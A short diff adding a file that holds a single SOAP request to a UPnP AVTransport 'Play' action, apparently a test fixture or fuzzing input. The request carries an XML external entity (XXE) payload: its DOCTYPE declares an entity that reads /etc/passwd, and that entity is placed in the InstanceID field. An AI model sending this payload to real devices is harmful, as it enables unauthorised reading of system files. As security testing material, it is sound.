@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE s:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>&xxe;</InstanceID><Speed>1</Speed></u:Play></s:Body></s:Envelope>
